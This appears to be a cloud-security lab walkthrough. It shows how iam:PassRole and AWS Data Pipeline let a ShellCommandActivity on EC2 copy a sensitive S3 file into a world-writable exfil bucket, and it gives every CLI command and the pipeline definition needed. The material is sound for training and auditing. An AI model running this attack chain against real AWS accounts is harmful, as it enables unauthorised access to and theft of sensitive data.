# Guided Walkthrough: Privilege Escalation via iam:PassRole + Data Pipeline with Resource Policy Bypass

This scenario demonstrates a sophisticated privilege escalation and data exfiltration technique using AWS Data Pipeline combined with an overly permissive S3 bucket resource policy. An attacker with `iam:PassRole` and Data Pipeline permissions can create a pipeline that executes arbitrary shell commands on EC2 instances, allowing them to access and exfiltrate sensitive S3 data.

The critical vulnerability in this scenario is the combination of two security weaknesses: (1) the ability to pass roles to Data Pipeline and execute arbitrary commands, and (2) an overly permissive bucket resource policy that allows writes from any principal. Even though the pipeline role only has `s3:GetObject` permissions (read-only), the write operation succeeds because the destination bucket's resource policy grants `s3:PutObject` to `Principal: "*"`, effectively bypassing IAM restrictions.

This attack pattern is particularly dangerous because it demonstrates how resource policies can override restrictive IAM policies, creating unexpected privilege escalation paths. Security teams often focus on IAM policies while overlooking permissive resource policies, making this a common blind spot in cloud security posture. The scenario highlights the importance of analyzing both IAM and resource-based policies together to identify true access paths.

## The Challenge

You start as `pl-prod-datapipeline-001-to-bucket-starting-user`, an IAM user with credentials provisioned by Terraform. Your permissions include `iam:PassRole` on the pipeline role, the three core Data Pipeline permissions (`CreatePipeline`, `PutPipelineDefinition`, `ActivatePipeline`), and `s3:GetObject` on the exfil bucket.

Your goal is to read the contents of `pl-sensitive-data-datapipeline-001-{account_id}-{suffix}` — a bucket you have no direct IAM access to. To reach it, you'll need to pass a role to AWS Data Pipeline, execute a shell command on an EC2 instance, and exploit a misconfigured resource policy on the exfil bucket to complete the data transfer.

Key resources:
- Starting user: `arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-bucket-starting-user`
- Pipeline role: `arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-bucket-pipeline-role`
- Sensitive bucket: `arn:aws:s3:::pl-sensitive-data-datapipeline-001-{account_id}-{suffix}`
- Exfil bucket: `arn:aws:s3:::pl-exfil-bucket-datapipeline-001-{account_id}-{suffix}`

## Reconnaissance

First, confirm your identity and verify that direct access to the sensitive bucket is denied:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::123456789012:user/pl-prod-datapipeline-001-to-bucket-starting-user

aws s3 cp s3://pl-sensitive-data-datapipeline-001-123456789012-abc123/secret-data.txt -
# An error occurred (AccessDenied) ...
```

Good — you can't read the sensitive bucket directly. Now look at the pipeline role's effective permissions. The role has `s3:GetObject` on the sensitive bucket, but no `s3:PutObject` anywhere in its IAM policies.

Now check the exfil bucket policy:

```bash
aws s3api get-bucket-policy --bucket pl-exfil-bucket-datapipeline-001-123456789012-abc123
```

The resource policy reveals the critical misconfiguration:

```json
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:PutObject",
  "Resource": "arn:aws:s3:::pl-exfil-bucket-datapipeline-001-123456789012-abc123/*"
}
```

Any AWS principal can write to this bucket — including the EC2 instance the pipeline will spin up. The IAM policy for the pipeline role says "no write access," but the bucket resource policy overrides that with an unconditional allow.

## Exploitation

With the resource policy bypass confirmed, the attack chain is clear: create a Data Pipeline that passes the read-only role to an EC2 instance, have that instance copy the sensitive file to the exfil bucket, then retrieve it yourself.

### Step 1: Create the pipeline

```bash
PIPELINE_ID=$(aws datapipeline create-pipeline \
    --region us-east-1 \
    --name "pl-datapipeline-001-exfil-pipeline" \
    --unique-id "datapipeline-$(date +%s)" \
    --query 'pipelineId' \
    --output text)

echo "Pipeline ID: $PIPELINE_ID"
```

### Step 2: Define the pipeline with a ShellCommandActivity

Create the pipeline definition JSON. The key parts are the `role` and `resourceRole` (both pointing at the pipeline role), and the `command` in the `ShellCommandActivity` that performs the exfiltration:

```bash
PIPELINE_ROLE_ARN="arn:aws:iam::123456789012:role/pl-prod-datapipeline-001-to-bucket-pipeline-role"
SENSITIVE_BUCKET="pl-sensitive-data-datapipeline-001-123456789012-abc123"
EXFIL_BUCKET="pl-exfil-bucket-datapipeline-001-123456789012-abc123"

cat > /tmp/pipeline_definition.json << EOF
{
  "objects": [
    {
      "id": "Default",
      "name": "Default",
      "scheduleType": "ONDEMAND",
      "failureAndRerunMode": "CASCADE",
      "role": "$PIPELINE_ROLE_ARN",
      "resourceRole": "$PIPELINE_ROLE_ARN"
    },
    {
      "id": "ExfilActivity",
      "name": "ExfilActivity",
      "type": "ShellCommandActivity",
      "command": "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt s3://$EXFIL_BUCKET/exfiltrated.txt --region us-east-1",
      "runsOn": {
        "ref": "ExfilResource"
      }
    },
    {
      "id": "ExfilResource",
      "name": "ExfilResource",
      "type": "Ec2Resource",
      "instanceType": "t3.micro",
      "terminateAfter": "30 Minutes",
      "securityGroups": "default"
    }
  ]
}
EOF

aws datapipeline put-pipeline-definition \
    --region us-east-1 \
    --pipeline-id "$PIPELINE_ID" \
    --pipeline-definition file:///tmp/pipeline_definition.json
```

### Step 3: Activate the pipeline

```bash
aws datapipeline activate-pipeline \
    --region us-east-1 \
    --pipeline-id "$PIPELINE_ID"
```

Data Pipeline will now launch a `t3.micro` EC2 instance running as the pipeline role. The instance will execute the `aws s3 cp` command. The read from the sensitive bucket succeeds via IAM (`s3:GetObject` is allowed). The write to the exfil bucket also succeeds — not through IAM (the role has no write permission), but through the bucket's `Principal: "*"` resource policy.

Wait approximately 60-90 seconds for the EC2 instance to launch and the shell command to complete.

## Verification

Once the pipeline has had time to execute, confirm the exfiltrated data is present and readable by your starting user:

```bash
# Check the exfil bucket for the output file
aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region us-east-1

# Read the exfiltrated data
aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region us-east-1
```

You should see the contents of `secret-data.txt` from the sensitive bucket. Bucket access achieved.

## What Happened

The attack succeeded because of a compounding misconfiguration: a user with `iam:PassRole` could inject any role into a compute service (Data Pipeline), which then ran arbitrary shell commands on an EC2 instance. The pipeline role itself was correctly scoped to read-only IAM access on the sensitive bucket — but the exfil bucket's resource policy opened a write path to the entire world (`Principal: "*"`), bypassing the role's IAM restrictions entirely.

This is the core lesson of resource policy bypass vulnerabilities. IAM policies and resource policies are evaluated together by AWS, but they operate independently. A bucket policy that grants access to `Principal: "*"` will allow any authenticated AWS principal to write to that bucket, regardless of what their IAM policies say. Security reviews that only audit IAM policies without also reviewing resource policies will miss this class of vulnerability.
